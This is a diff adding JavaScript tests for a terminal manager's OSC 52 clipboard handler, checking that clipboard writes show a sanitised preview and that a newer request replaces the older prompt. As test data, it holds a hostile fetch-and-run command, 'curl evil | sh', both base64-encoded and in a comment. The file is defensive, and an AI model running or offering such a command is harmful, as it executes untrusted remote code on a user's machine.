@@ -219,6 +219,47 @@ test('OSC 52 handler requires a user action before writing the clipboard', async
     delete global.navigator.clipboard;
 });
 
+test('OSC 52 prompt previews its text and a newer request replaces the prompt', async () => {
+    const writes = [];
+    let handler;
+    const presentations = [];
+    const dismissed = [];
+    global.navigator.clipboard = {writeText(text) { writes.push(text); return Promise.resolve(); }};
+    const terminal = {parser: {registerOscHandler(identifier, callback) { handler = callback; return {dispose() {}}; }}};
+    global.window.showNotification = value => {
+        presentations.push(value);
+        const index = presentations.length - 1;
+        return () => { dismissed.push(index); value.onDismiss?.(); };
+    };
+    const registered = TerminalManager.registerOsc52ClipboardHandler(terminal);
+
+    // "ls -la\nrm" then "curl evil | sh"
+    assert.equal(handler(';bHMgLWxhCnJt'), true);
+    assert.match(presentations[0].message, /ls -la\u23cerm/);
+    assert.equal(handler(';Y3VybCBldmlsIHwgc2g='), true);
+
+    // The first prompt is closed; its button no longer copies anything.
+    assert.deepEqual(dismissed, [0]);
+    presentations[0].action.onClick();
+    await new Promise(resolve => setImmediate(resolve));
+    assert.deepEqual(writes, []);
+    // The second prompt shows and copies exactly its own text.
+    assert.match(presentations[1].message, /curl evil \| sh/);
+    presentations[1].action.onClick();
+    await new Promise(resolve => setImmediate(resolve));
+    assert.deepEqual(writes, ['curl evil | sh']);
+    registered.dispose();
+    delete global.window.showNotification;
+    delete global.navigator.clipboard;
+});
+
+test('OSC 52 preview shows control characters and shortens long text', () => {
+    assert.equal(TerminalManager.osc52ClipboardPreview('a\tb\x1bc'), 'a b c');
+    assert.equal(TerminalManager.osc52ClipboardPreview('ab\u202ecd\u200b'), 'ab\ufffdcd\ufffd');
+    const preview = TerminalManager.osc52ClipboardPreview('x'.repeat(200));
+    assert.equal(preview, `${'x'.repeat(80)}\u2026`);
+});
+
 test('socket output is acknowledged after TerminalManager accepts it', () => {
     const calls = [];
     const originalWriteOutput = TerminalManager.writeOutput;
